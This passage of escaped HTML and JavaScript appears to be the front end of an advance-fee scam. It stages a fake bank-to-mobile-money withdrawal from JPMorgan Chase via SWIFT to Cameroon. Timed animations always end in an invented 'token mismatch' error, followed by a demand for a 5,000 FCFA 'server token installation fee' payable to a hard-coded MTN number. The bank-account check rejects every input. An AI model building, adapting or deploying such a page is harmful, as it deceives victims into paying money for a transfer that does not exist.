style=\"display:flex;justify-content:space-between;padding:6px 0;\"><span style=\"font-size:12px;color:#888;\">Status<\/span><span id=\"mtn-proc-status\" style=\"font-size:12px;font-weight:700;color:#2d6a4f;\">Processing...<\/span><\/div>\r\n      <\/div>\r\n    <\/div>\r\n\r\n    <!-- \u2500\u2500 STAGE 2: JOURNEY \u2500\u2500 -->\r\n    <div id=\"mtn-stage-journey\" style=\"display:none;animation:stageIn 0.5s ease;\">\r\n      <p style=\"font-size:11px;font-weight:700;color:#aaa;margin:0 0 18px;text-align:center;text-transform:uppercase;letter-spacing:0.07em;\">Live Transfer Tracking<\/p>\r\n\r\n      <div style=\"position:relative;padding:0 0 0 56px;min-height:320px;\" id=\"journey-track\">\r\n\r\n        <!-- SVG for animated packet + connector lines -->\r\n        <svg id=\"journey-svg\" style=\"position:absolute;left:0;top:0;width:56px;height:320px;overflow:visible;pointer-events:none;\" viewBox=\"0 0 56 320\">\r\n          <line id=\"line-1\" x1=\"20\" y1=\"36\" x2=\"20\" y2=\"96\" stroke=\"#003087\" stroke-width=\"2\" stroke-dasharray=\"5,4\" opacity=\"0\" style=\"transition:opacity 0.4s;\"\/>\r\n          <line id=\"line-2\" x1=\"20\" y1=\"136\" x2=\"20\" y2=\"196\" stroke=\"#666\" stroke-width=\"2\" stroke-dasharray=\"5,4\" opacity=\"0\" style=\"transition:opacity 0.4s;\"\/>\r\n          <line id=\"line-3\" x1=\"20\" y1=\"236\" x2=\"20\" y2=\"296\" stroke=\"#ffcc00\" stroke-width=\"2\" stroke-dasharray=\"5,4\" opacity=\"0\" style=\"transition:opacity 0.4s;\"\/>\r\n          <!-- Money packet -->\r\n          <g id=\"money-packet\" style=\"display:none;\">\r\n            <circle id=\"pkt-glow\" cx=\"20\" cy=\"0\" r=\"10\" fill=\"none\" stroke-width=\"3\" opacity=\"0.4\"\/>\r\n            <circle cx=\"20\" cy=\"0\" r=\"7\" id=\"pkt-core\"\/>\r\n            <text x=\"20\" y=\"4\" text-anchor=\"middle\" font-size=\"8\" font-weight=\"700\" fill=\"white\">$<\/text>\r\n          <\/g>\r\n          <!-- Return packet -->\r\n          <g id=\"return-packet\" style=\"display:none;\">\r\n            <circle cx=\"20\" cy=\"0\" r=\"7\" fill=\"#e74c3c\"\/>\r\n            <text x=\"20\" y=\"4\" text-anchor=\"middle\" font-size=\"8\" font-weight=\"700\" fill=\"white\">&#8629;<\/text>\r\n          <\/g>\r\n        <\/svg>\r\n\r\n        <!-- Node 1 -->\r\n        <div id=\"node-1\" style=\"position:relative;margin-bottom:16px;opacity:0;transform:translateY(8px);transition:opacity 0.6s ease,transform 0.6s ease;\">\r\n          <div id=\"ripple-1\" style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;border:2px solid #003087;opacity:0;pointer-events:none;\"><\/div>\r\n          <div style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;background:#003087;display:flex;align-items:center;justify-content:center;z-index:1;\"><span style=\"font-size:16px;\">\uD83C\uDFDB<\/span><\/div>\r\n          <div style=\"background:#f0f4ff;border:1px solid #c5d3f5;border-radius:8px;padding:10px 14px;\">\r\n            <p style=\"font-size:13px;font-weight:700;color:#1a1a1a;margin:0 0 2px;\">JPMorgan Chase Bank, N.A.<\/p>\r\n            <p style=\"font-size:11px;color:#5566aa;margin:0;\">New York, USA \uD83C\uDDFA\uD83C\uDDF8<\/p>\r\n          <\/div>\r\n        <\/div>\r\n\r\n        <!-- Node 2 -->\r\n        <div id=\"node-2\" style=\"position:relative;margin-bottom:16px;opacity:0;transform:translateY(8px);transition:opacity 0.6s ease,transform 0.6s ease;\">\r\n          <div id=\"ripple-2\" style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;border:2px solid #444;opacity:0;pointer-events:none;\"><\/div>\r\n          <div style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;background:#444;display:flex;align-items:center;justify-content:center;z-index:1;\"><span style=\"font-size:16px;\">\uD83C\uDF10<\/span><\/div>\r\n          <div style=\"background:#f5f5f5;border:1px solid #ddd;border-radius:8px;padding:10px 14px;\">\r\n            <p style=\"font-size:13px;font-weight:700;color:#1a1a1a;margin:0 0 2px;\">SWIFT International Gateway<\/p>\r\n            <p style=\"font-size:11px;color:#888;margin:0;\">Interbank Routing Network \uD83D\uDD04<\/p>\r\n          <\/div>\r\n        <\/div>\r\n\r\n        <!-- Node 3 -->\r\n        <div id=\"node-3\" style=\"position:relative;margin-bottom:16px;opacity:0;transform:translateY(8px);transition:opacity 0.6s ease,transform 0.6s ease;\">\r\n          <div id=\"ripple-3\" style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;border:2px solid #ffcc00;opacity:0;pointer-events:none;\"><\/div>\r\n          <div style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;background:#ffcc00;display:flex;align-items:center;justify-content:center;z-index:1;\"><span style=\"font-size:16px;\">\uD83D\uDCE1<\/span><\/div>\r\n          <div style=\"background:#ff6600;border:1px solid #ffe082;border-radius:8px;padding:10px 14px;\">\r\n            <p style=\"font-size:13px;font-weight:700;color:#1a1a1a;margin:0 0 2px;\">Orange Money Gateway<\/p>\r\n            <p style=\"font-size:11px;color:#b8860b;margin:0;\">Douala, Cameroon \uD83C\uDDE8\uD83C\uDDF2<\/p>\r\n          <\/div>\r\n        <\/div>\r\n\r\n        <!-- Node 4 -->\r\n        <div id=\"node-4\" style=\"position:relative;opacity:0;transform:translateY(8px);transition:opacity 0.6s ease,transform 0.6s ease;\">\r\n          <div id=\"ripple-4\" style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;border:2px solid #2d6a4f;opacity:0;pointer-events:none;\"><\/div>\r\n          <div style=\"position:absolute;left:-50px;top:2px;width:32px;height:32px;border-radius:50%;background:#2d6a4f;display:flex;align-items:center;justify-content:center;z-index:1;\"><span style=\"font-size:16px;\">\uD83D\uDCF1<\/span><\/div>\r\n          <div id=\"node-4-box\" style=\"background:#eaf5ee;border:1px solid #b7dfc5;border-radius:8px;padding:10px 14px;transition:background 0.4s,border-color 0.4s;\">\r\n            <p id=\"node-4-title\" style=\"font-size:13px;font-weight:700;color:#1a1a1a;margin:0 0 2px;\">Recipient Account<\/p>\r\n            <p id=\"node-4-sub\" style=\"font-size:11px;color:#2d6a4f;margin:0;\"><\/p>\r\n          <\/div>\r\n        <\/div>\r\n      <\/div>\r\n\r\n      <!-- Status bar -->\r\n      <div style=\"margin-top:16px;background:#f9f9f9;border:1px solid #e0e0e0;border-radius:8px;padding:10px 14px;min-height:40px;\">\r\n        <p id=\"journey-status\" style=\"font-size:12px;color:#555;margin:0;font-weight:600;transition:opacity 0.3s;text-align:center;\"><\/p>\r\n        <div id=\"journey-substatus\" style=\"font-size:11px;color:#aaa;margin:3px 0 0;text-align:center;\"><\/div>\r\n      <\/div>\r\n    <\/div>\r\n\r\n    <!-- \u2500\u2500 STAGE 3: CLASH \u2500\u2500 -->\r\n    <div id=\"mtn-stage-clash\" style=\"display:none;animation:stageIn 0.5s ease;\">\r\n      <div style=\"text-align:center;margin-bottom:1rem;padding:0.5rem 0;\">\r\n        <div style=\"display:flex;align-items:center;justify-content:center;position:relative;height:68px;\">\r\n          <div id=\"clash-left\" style=\"font-size:34px;position:absolute;left:18%;\">\uD83D\uDCB3<\/div>\r\n          <div id=\"clash-spark\" style=\"font-size:30px;position:absolute;opacity:0;\">\uD83D\uDCA5<\/div>\r\n          <div id=\"clash-right\" style=\"font-size:34px;position:absolute;right:18%;\">\uD83D\uDD12<\/div>\r\n        <\/div>\r\n        <p id=\"clash-title\" style=\"font-size:15px;font-weight:700;color:#c0392b;margin:8px 0 3px;font-family:monospace;overflow:hidden;white-space:nowrap;width:0;display:inline-block;\"><\/p>\r\n        <p style=\"font-size:12px;color:#888;margin:4px 0 0;line-height:1.6;\">The token on the recipient account does not match<br>the routing protocol of the sending server.<\/p>\r\n        <p style=\"font-size:11px;color:#c0392b;font-family:monospace;margin:6px 0 0;background:#fff0f0;display:inline-block;padding:3px 10px;border-radius:4px;border:1px solid #f5c6cb;letter-spacing:0.04em;\">ERR_TOKEN_INCOMPATIBLE :: CODE 4403<\/p>\r\n      <\/div>\r\n      <div style=\"background:#f9f9f9;border:1px solid #e0e0e0;border-radius:10px;padding:1rem;margin-bottom:1rem;\">\r\n        <div style=\"display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #eee;\"><span style=\"font-size:12px;color:#888;\">From<\/span><span style=\"font-size:12px;font-weight:700;color:#1a1a1a;\">JPMorgan Chase Bank, N.A.<\/span><\/div>\r\n        <div style=\"display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #eee;\"><span style=\"font-size:12px;color:#888;\">To<\/span><span id=\"clash-to\" style=\"font-size:12px;font-weight:700;color:#1a1a1a;\">\u2014<\/span><\/div>\r\n        <div style=\"display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #eee;\"><span style=\"font-size:12px;color:#888;\">Amount<\/span><span id=\"clash-amount\" style=\"font-size:13px;font-weight:700;color:#1a1a1a;\">\u2014<\/span><\/div>\r\n        <div style=\"display:flex;justify-content:space-between;padding:6px 0;\"><span style=\"font-size:12px;color:#888;\">Status<\/span><span style=\"font-size:12px;font-weight:700;color:#c0392b;\">Bounced Back &#8617;<\/span><\/div>\r\n      <\/div>\r\n      <div style=\"background:#eaf5ee;border:1px solid #b7dfc5;border-radius:10px;padding:0.9rem 1rem;margin-bottom:1rem;display:flex;align-items:flex-start;gap:10px;\">\r\n        <span style=\"font-size:20px;flex-shrink:0;line-height:1.3;\">\uD83D\uDD01<\/span>\r\n        <div>\r\n          <p style=\"font-size:13px;font-weight:700;color:#2d6a4f;margin:0 0 3px;\">Money Returned to Your Account<\/p>\r\n          <p style=\"font-size:12px;color:#1e5631;margin:0;line-height:1.7;\"><strong id=\"clash-refund-amount\">\u2014<\/strong> was automatically bounced back and credited to your account. No funds were lost.<\/p>\r\n        <\/div>\r\n      <\/div>\r\n      <div style=\"background:#fff8e1;border:1px solid #ffe082;border-radius:10px;padding:0.9rem 1rem;margin-bottom:1rem;\">\r\n        <p style=\"font-size:11px;font-weight:700;color:#7a5800;margin:0 0 6px;text-transform:uppercase;letter-spacing:0.05em;\">\uD83D\uDCA1 What Needs to Happen<\/p>\r\n        <p style=\"font-size:12px;color:#7a5800;margin:0;line-height:1.75;\">A <strong>compatible Interbank Transfer Token<\/strong> must also be installed on the <strong>JPMorgan Chase server in the USA<\/strong>. This synchronises both ends of the corridor so funds pass through without being rejected.<\/p>\r\n      <\/div>\r\n      <div id=\"fee-box\" style=\"border:1px solid #e0e0e0;border-radius:10px;padding:0.85rem 1rem;margin-bottom:1.25rem;display:flex;align-items:center;justify-content:space-between;background:#fafafa;transition:box-shadow 0.4s,border-color 0.4s;\">\r\n        <div>\r\n          <p style=\"font-size:11px;color:#888;margin:0 0 3px;text-transform:uppercase;letter-spacing:0.04em;font-weight:700;\">Server Token Installation Fee<\/p>\r\n          <p id=\"fee-amount\" style=\"font-size:24px;font-weight:700;color:#1a1a1a;margin:0;line-height:1;transition:color 0.4s;\">5,000 <span style=\"font-size:13px;color:#888;font-weight:400;\">FCFA<\/span><\/p>\r\n        <\/div>\r\n        <span style=\"font-size:26px;\">\uD83D\uDD11<\/span>\r\n      <\/div>\r\n      <button onclick=\"closeMTNOverlay()\" style=\"width:100%;padding:0.8rem;background:#ffcc00;color:#1a1200;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:10px;\">PAY NOW &#8594;<\/button>\r\n      <button onclick=\"closeMTNOverlay()\" style=\"width:100%;padding:0.6rem;background:transparent;color:#888;border:1px solid #ddd;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;\">Cancel<\/button>\r\n    <\/div>\r\n\r\n  <\/div>\r\n<\/div>\r\n\r\n\r\n<script>\r\n\/* ============================================================\r\n   CONFIGURATION \u2014 edit these values\r\n============================================================ *\/\r\nvar MTN_FIXED_NUMBER = '+237 692066776'; \/* \u270F\uFE0F Replace with real number *\/\r\n\/* ============================================================ *\/\r\n\r\nvar mtnTimerInterval = null;\r\nvar mtnTimerStart = null;\r\nvar pktAnim = null;\r\n\r\ndocument.getElementById('mtn-fixed-number').textContent = MTN_FIXED_NUMBER;\r\n\r\nfunction fmt(n){ return Number(n).toLocaleString()+' FCFA'; }\r\n\r\n\/* \u2500\u2500 Progress bar \u2500\u2500 *\/\r\nfunction setProgress(stage){\r\n  ['pb-1','pb-2','pb-3'].forEach(function(id,i){\r\n    document.getElementById(id).style.background = i < stage ? '#ffcc00' : '#ccc';\r\n  });\r\n  document.getElementById('pb-label').textContent = stage+' \/ 3';\r\n}\r\n\r\n\/* \u2500\u2500 Elapsed timer \u2500\u2500 *\/\r\nfunction startTimer(){\r\n  mtnTimerStart = Date.now();\r\n  mtnTimerInterval = setInterval(function(){\r\n    var ms = Date.now()-mtnTimerStart;\r\n    var h=Math.floor(ms\/3600000), m=Math.floor((ms%3600000)\/60000), s=Math.floor((ms%60000)\/1000), ms2=ms%1000;\r\n    var el=document.getElementById('mtn-timer');\r\n    if(el) el.textContent=p2(h)+':'+p2(m)+':'+p2(s)+'.'+p3(ms2);\r\n  },30);\r\n}\r\nfunction stopTimer(){ if(mtnTimerInterval){clearInterval(mtnTimerInterval);mtnTimerInterval=null;} }\r\nfunction p2(n){return n<10?'0'+n:''+n;}\r\nfunction p3(n){return n<10?'00'+n:n<100?'0'+n:''+n;}\r\n\r\n\/* \u2500\u2500 Stage switcher \u2500\u2500 *\/\r\nfunction showStage(id){\r\n  ['mtn-stage-sending','mtn-stage-journey','mtn-stage-clash'].forEach(function(s){\r\n    document.getElementById(s).style.display = s===id?'block':'none';\r\n  });\r\n}\r\n\r\n\/* \u2500\u2500 Ripple on node icon \u2500\u2500 *\/\r\nfunction fireRipple(id, color){\r\n  var el=document.getElementById(id);\r\n  if(!el) return;\r\n  el.style.borderColor = color||'#2d6a4f';\r\n  el.style.animation='none'; el.style.opacity='0';\r\n  void el.offsetWidth;\r\n  el.style.opacity='0.9';\r\n  el.style.animation='rippleOut 0.9s ease-out forwards';\r\n}\r\n\r\n\/* \u2500\u2500 Fade node in \u2500\u2500 *\/\r\nfunction showNode(id, rippleId, delay){\r\n  setTimeout(function(){\r\n    var el=document.getElementById(id);\r\n    if(el){el.style.opacity='1';el.style.transform='translateY(0)';}\r\n    if(rippleId) fireRipple(rippleId);\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 SVG connector lines \u2500\u2500 *\/\r\nfunction showLine(id, delay){\r\n  setTimeout(function(){\r\n    var el=document.getElementById(id);\r\n    if(el) el.setAttribute('opacity','1');\r\n  }, delay);\r\n}\r\nfunction hideLine(id, delay){\r\n  setTimeout(function(){\r\n    var el=document.getElementById(id);\r\n    if(el) el.setAttribute('opacity','0');\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 Animated money packet (SVG rAF) \u2500\u2500 *\/\r\nfunction animatePacket(fromY, toY, color, delay, duration, onDone){\r\n  setTimeout(function(){\r\n    var pkt=document.getElementById('money-packet');\r\n    var core=document.getElementById('pkt-core');\r\n    var glow=document.getElementById('pkt-glow');\r\n    if(!pkt||!core||!glow) return;\r\n    core.setAttribute('fill', color);\r\n    glow.setAttribute('stroke', color);\r\n    pkt.style.display='block';\r\n    var start=null;\r\n    var dist=toY-fromY;\r\n    function step(ts){\r\n      if(!start) start=ts;\r\n      var prog=Math.min((ts-start)\/duration,1);\r\n      var ease=prog<0.5?2*prog*prog:-1+(4-2*prog)*prog;\r\n      var cy=fromY+dist*ease;\r\n      var wobble=Math.sin(prog*Math.PI*4)*1.5;\r\n      pkt.setAttribute('transform','translate('+wobble+','+cy+')');\r\n      if(prog<1){ pktAnim=requestAnimationFrame(step); }\r\n      else { if(onDone) onDone(); }\r\n    }\r\n    pktAnim=requestAnimationFrame(step);\r\n  }, delay);\r\n}\r\n\r\nfunction hidePacket(delay){\r\n  setTimeout(function(){\r\n    var pkt=document.getElementById('money-packet');\r\n    if(pkt) pkt.style.display='none';\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 Return packet (bounces back up red) \u2500\u2500 *\/\r\nfunction animateReturnPacket(fromY, toY, delay, duration){\r\n  setTimeout(function(){\r\n    var pkt=document.getElementById('return-packet');\r\n    if(!pkt) return;\r\n    pkt.style.display='block';\r\n    var start=null;\r\n    var dist=toY-fromY;\r\n    function step(ts){\r\n      if(!start) start=ts;\r\n      var prog=Math.min((ts-start)\/duration,1);\r\n      var ease=prog<0.5?2*prog*prog:-1+(4-2*prog)*prog;\r\n      var cy=fromY+dist*ease;\r\n      pkt.setAttribute('transform','translate(0,'+cy+')');\r\n      if(prog<1){ requestAnimationFrame(step); }\r\n      else{ setTimeout(function(){pkt.style.display='none';},200); }\r\n    }\r\n    requestAnimationFrame(step);\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 Status text \u2500\u2500 *\/\r\nfunction setStatus(msg, sub, delay){\r\n  setTimeout(function(){\r\n    var el=document.getElementById('journey-status');\r\n    var sel=document.getElementById('journey-substatus');\r\n    if(!el) return;\r\n    el.style.opacity='0';\r\n    setTimeout(function(){\r\n      el.textContent=msg;\r\n      if(sel) sel.textContent=sub||'';\r\n      el.style.opacity='1';\r\n    },200);\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 Typewriter \u2500\u2500 *\/\r\nfunction typeWriter(elId, text, delay){\r\n  setTimeout(function(){\r\n    var el=document.getElementById(elId);\r\n    if(!el) return;\r\n    el.style.width='0'; el.textContent='';\r\n    var i=0;\r\n    var iv=setInterval(function(){\r\n      el.textContent+=text[i]; el.style.width='auto'; i++;\r\n      if(i>=text.length) clearInterval(iv);\r\n    },50);\r\n  }, delay);\r\n}\r\n\r\n\/* \u2500\u2500 Clash animation \u2500\u2500 *\/\r\nfunction runClashAnimation(){\r\n  var left=document.getElementById('clash-left');\r\n  var right=document.getElementById('clash-right');\r\n  var spark=document.getElementById('clash-spark');\r\n  if(left){left.style.animation='none';left.style.left='18%';}\r\n  if(right){right.style.animation='none';right.style.right='18%';}\r\n  if(spark){spark.style.animation='none';spark.style.opacity='0';}\r\n  void (left&&left.offsetWidth);\r\n  if(left) left.style.animation='clashLeft 0.7s ease-out forwards';\r\n  if(right) right.style.animation='clashRight 0.7s ease-out forwards';\r\n  setTimeout(function(){\r\n    if(spark) spark.style.animation='sparkPop 0.8s ease-out forwards';\r\n    var modal=document.getElementById('mtn-modal');\r\n    if(modal){modal.style.animation='none';void modal.offsetWidth;modal.style.animation='modalShake 0.5s ease';}\r\n    typeWriter('clash-title','Token Incompatibility Detected!',120);\r\n    setTimeout(function(){\r\n      var feeEl=document.getElementById('fee-amount');\r\n      if(feeEl) feeEl.style.animation='feeFlash 1.3s ease 2';\r\n      var feeBox=document.getElementById('fee-box');\r\n      if(feeBox){\r\n        feeBox.style.boxShadow='0 0 0 3px rgba(45,106,79,0.25)';\r\n        feeBox.style.borderColor='#b7dfc5';\r\n        setTimeout(function(){feeBox.style.boxShadow='none';feeBox.style.borderColor='#e0e0e0';},2200);\r\n      }\r\n    },900);\r\n  },650);\r\n}\r\n\r\n\/* \u2500\u2500 Full reset before replaying \u2500\u2500 *\/\r\nfunction resetJourney(){\r\n  ['node-1','node-2','node-3','node-4'].forEach(function(id){\r\n    var el=document.getElementById(id);\r\n    if(el){el.style.opacity='0';el.style.transform='translateY(8px)';}\r\n  });\r\n  ['line-1','line-2','line-3'].forEach(function(id){\r\n    var el=document.getElementById(id);\r\n    if(el){el.setAttribute('opacity','0');el.setAttribute('stroke-dasharray','5,4');}\r\n  });\r\n  var pkt=document.getElementById('money-packet');\r\n  var rpkt=document.getElementById('return-packet');\r\n  if(pkt) pkt.style.display='none';\r\n  if(rpkt) rpkt.style.display='none';\r\n  ['ripple-1','ripple-2','ripple-3','ripple-4'].forEach(function(id){\r\n    var el=document.getElementById(id);\r\n    if(el){el.style.animation='none';el.style.opacity='0';}\r\n  });\r\n  var box=document.getElementById('node-4-box');\r\n  var title=document.getElementById('node-4-title');\r\n  var sub=document.getElementById('node-4-sub');\r\n  if(box){box.style.background='#eaf5ee';box.style.borderColor='#b7dfc5';box.style.animation='none';box.style.boxShadow='none';}\r\n  if(title) title.textContent='Recipient Account';\r\n  if(sub){sub.textContent=MTN_FIXED_NUMBER;sub.style.color='#2d6a4f';}\r\n  var st=document.getElementById('journey-status');\r\n  var ss=document.getElementById('journey-substatus');\r\n  if(st) st.textContent='';\r\n  if(ss) ss.textContent='';\r\n  var cl=document.getElementById('clash-left'); if(cl) cl.style.left='18%';\r\n  var cr=document.getElementById('clash-right'); if(cr) cr.style.right='18%';\r\n  var ct=document.getElementById('clash-title'); if(ct){ct.style.width='0';ct.textContent='';}\r\n}\r\n\r\n\/* \u2500\u2500 Node Y positions in the SVG viewBox \u2500\u2500 *\/\r\nvar NODE_Y = [18, 118, 218, 298];\r\n\r\n\/* \u2500\u2500 Main journey sequence \u2500\u2500 *\/\r\nfunction runJourneyAnimation(){\r\n  resetJourney();\r\n  showStage('mtn-stage-journey');\r\n  setProgress(2);\r\n  stopTimer();\r\n\r\n  \/* Node 1 *\/\r\n  setStatus('\uD83D\uDCE4 Dispatching funds from JPMorgan Chase, New York...','Authenticated & authorised', 200);\r\n  showNode('node-1','ripple-1', 400);\r\n\r\n  \/* Packet: Node1 \u2192 Node2 *\/\r\n  showLine('line-1', 1400);\r\n  setStatus('\uD83C\uDF10 Routing through SWIFT international gateway...','Encrypted international wire', 1800);\r\n  animatePacket(NODE_Y[0], NODE_Y[1], '#003087', 1500, 1800, null);\r\n\r\n  \/* Node 2 *\/\r\n  showNode('node-2','ripple-2', 3200);\r\n  hideLine('line-1', 3400);\r\n\r\n  \/* Packet: Node2 \u2192 Node3 *\/\r\n  showLine('line-2', 4200);\r\n  setStatus('\uD83D\uDCE1 Forwarding to MTN MoMo Gateway, Cameroon...','Cross-border handoff confirmed', 4500);\r\n  animatePacket(NODE_Y[1], NODE_Y[2], '#444444', 4000, 2000, null);\r\n\r\n  \/* Node 3 *\/\r\n  showNode('node-3','ripple-3', 6000);\r\n  hideLine('line-2', 6200);\r\n\r\n  \/* Packet: Node3 \u2192 Node4 *\/\r\n  showLine('line-3', 7000);\r\n  setStatus('\uD83D\uDD0D Verifying Interbank Transfer Token...','Recipient account validation in progress', 7200);\r\n  animatePacket(NODE_Y[2], NODE_Y[3], '#ffcc00', 6800, 2000, null);\r\n\r\n  \/* Node 4 arrives *\/\r\n  showNode('node-4','ripple-4', 8800);\r\n  hideLine('line-3', 9200);\r\n\r\n  \/* Token mismatch *\/\r\n  setTimeout(function(){\r\n    setStatus('\u26A0\uFE0F Token mismatch detected!','Transfer rejected \u2014 bouncing funds back', 0);\r\n    var box=document.getElementById('node-4-box');\r\n    var title=document.getElementById('node-4-title');\r\n    var sub=document.getElementById('node-4-sub');\r\n    if(box){box.style.background='#fdecea';box.style.borderColor='#f5c6cb';box.style.animation='nodeReject 0.5s ease 4';}\r\n    if(title) title.textContent='\u26A0 Token Mismatch!';\r\n    if(sub){sub.textContent='Incompatible \u2014 transfer rejected';sub.style.color='#c0392b';}\r\n\r\n    \/* Lines turn red *\/\r\n    setTimeout(function(){\r\n      ['line-1','line-2','line-3'].forEach(function(id){\r\n        var el=document.getElementById(id);\r\n        if(el){\r\n          el.setAttribute('opacity','1');\r\n          el.setAttribute('stroke','#e74c3c');\r\n        }\r\n      });\r\n      \/* Return packet flies back up *\/\r\n      animateReturnPacket(NODE_Y[3], NODE_Y[0], 500, 3000);\r\n      setTimeout(function(){\r\n        ['line-1','line-2','line-3'].forEach(function(id){\r\n          var el=document.getElementById(id);\r\n          if(el) el.setAttribute('opacity','0');\r\n        });\r\n      }, 3600);\r\n    }, 800);\r\n  }, 10000);\r\n\r\n  \/* Clash stage *\/\r\n  setTimeout(function(){\r\n    showStage('mtn-stage-clash');\r\n    setProgress(3);\r\n    runClashAnimation();\r\n  }, 14500);\r\n}\r\n\r\n\/* \u2500\u2500 Bank toggle + validate \u2500\u2500 *\/\r\nfunction toggleBank(){\r\n  var p=document.getElementById('bank-panel');\r\n  p.style.display=p.style.display==='none'?'block':'none';\r\n  if(p.style.display==='none'){\r\n    document.getElementById('bank-input').value='';\r\n    document.getElementById('bank-amount-input').value='';\r\n    document.getElementById('bank-error').style.display='none';\r\n    document.getElementById('bank-amount-error').style.display='none';\r\n  }\r\n}\r\nfunction validateBank(){\r\n  var acct=document.getElementById('bank-input').value.trim();\r\n  var amt=parseFloat(document.getElementById('bank-amount-input').value);\r\n  var be=document.getElementById('bank-error');\r\n  var ae=document.getElementById('bank-amount-error');\r\n  be.style.display='none'; ae.style.display='none';\r\n  if(isNaN(amt)||document.getElementById('bank-amount-input').value===''){ae.innerHTML='&#10007; Please enter a withdrawal amount.';ae.style.display='block';return;}\r\n  if(amt<1000){ae.innerHTML='&#10007; Minimum withdrawal is 1,000 FCFA.';ae.style.display='block';return;}\r\n  if(amt>786400){ae.innerHTML='&#10007; Maximum withdrawal is 500,000 FCFA.';ae.style.display='block';return;}\r\n  if(acct.length===0){be.innerHTML='&#10007; Please enter your Bank of America account number.';be.style.display='block';return;}\r\n  be.innerHTML='&#10007; Invalid account number. Please use a valid Bank of America account.';be.style.display='block';\r\n}\r\n\r\n\/* \u2500\u2500 MTN toggle + validate \u2500\u2500 *\/\r\nfunction toggleMTN(){\r\n  var p=document.getElementById('mtn-panel');\r\n  p.style.display=p.style.display==='none'?'block':'none';\r\n  if(p.style.display==='none'){\r\n    document.getElementById('mtn-amount-input').value='';\r\n    document.getElementById('mtn-amount-error').style.display='none';\r\n  }\r\n}\r\nfunction validateMTN(){\r\n  var amt=parseFloat(document.getElementById('mtn-amount-input').value);\r\n  var ae=document.getElementById('mtn-amount-error');\r\n  ae.style.display='none';\r\n  if(isNaN(amt)||document.getElementById('mtn-amount-input').value===''){ae.innerHTML='&#10007; Please enter a withdrawal amount.';ae.style.display='block';return;}\r\n  if(amt<1000){ae.innerHTML='&#10007; Minimum withdrawal is 1,000 FCFA.';ae.style.display='block';return;}\r\n  if(amt>500000){ae.innerHTML='&#10007; Maximum withdrawal is 500,000 FCFA.';ae.style.display='block';return;}\r\n\r\n  var fmtAmt=fmt(amt);\r\n  document.getElementById('mtn-proc-to').textContent=MTN_FIXED_NUMBER;\r\n  document.getElementById('mtn-proc-amount').textContent=fmtAmt;\r\n  document.getElementById('clash-to').textContent=MTN_FIXED_NUMBER;\r\n  document.getElementById('clash-amount').textContent=fmtAmt;\r\n  document.getElementById('clash-refund-amount').textContent=fmtAmt;\r\n  document.getElementById('node-4-sub').textContent=MTN_FIXED_NUMBER;\r\n  document.getElementById('mtn-proc-label').textContent='Initiating transfer...';\r\n  document.getElementById('mtn-proc-status').textContent='Processing...';\r\n  document.getElementById('mtn-proc-status').style.color='#2d6a4f';\r\n  document.getElementById('mtn-timer').textContent='00:00:00.000';\r\n\r\n  setProgress(1);\r\n  showStage('mtn-stage-sending');\r\n  document.getElementById('mtn-overlay').style.display='flex';\r\n  startTimer();\r\n\r\n  setTimeout(function(){document.getElementById('mtn-proc-label').textContent='Connecting to JPMorgan Chase...';},1200);\r\n  setTimeout(function(){document.getElementById('mtn-proc-label').textContent='Authorising international wire...';document.getElementById('mtn-proc-status').textContent='Authorising...';},2800);\r\n  setTimeout(function(){document.getElementById('mtn-proc-label').textContent='Funds dispatched from USA...';document.getElementById('mtn-proc-status').textContent='In Transit...';},4500);\r\n  setTimeout(function(){stopTimer();runJourneyAnimation();},6000);\r\n}\r\n\r\nfunction closeMTNOverlay(){\r\n  stopTimer();\r\n  if(pktAnim) cancelAnimationFrame(pktAnim);\r\n  document.getElementById('mtn-overlay').style.display='none';\r\n}\r\n<\/script>\r\n\r\n<\/body>\r\n<\/html>",
